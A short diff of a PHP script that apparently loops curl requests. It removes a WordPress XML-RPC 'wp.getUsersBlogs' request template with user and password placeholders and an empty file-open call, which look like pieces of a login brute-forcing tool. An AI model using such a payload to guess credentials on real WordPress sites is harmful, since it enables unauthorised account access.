@@ -26,10 +26,4 @@ for ($i=0; $i < $count; $i++) {
 	$data = curl_exec($ch);
 	print($data);
 }
-
-$brute = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>";
-
-$file = fopen("", 'r');
-
-
 ?>
